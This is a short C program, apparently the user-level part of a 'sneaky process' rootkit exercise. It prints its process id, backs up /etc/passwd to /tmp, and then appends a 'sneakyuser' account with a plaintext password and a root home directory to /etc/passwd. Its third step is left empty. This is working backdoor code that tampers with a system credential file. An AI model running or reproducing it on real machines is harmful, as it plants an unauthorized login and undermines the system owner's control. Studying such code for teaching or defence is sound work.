#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void print_pid()
{
    printf("sneaky_process pid = %d\n", getpid());
}



int main() {
  print_pid();
  // Step 1: Copy /etc/passwd to /tmp/passwd
  system("cp /etc/passwd /tmp");
  // Step 2: Add sneakyuser entry to /etc/passwd
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
         "/etc/passwd");
  // Step 3: 
  return 0;
}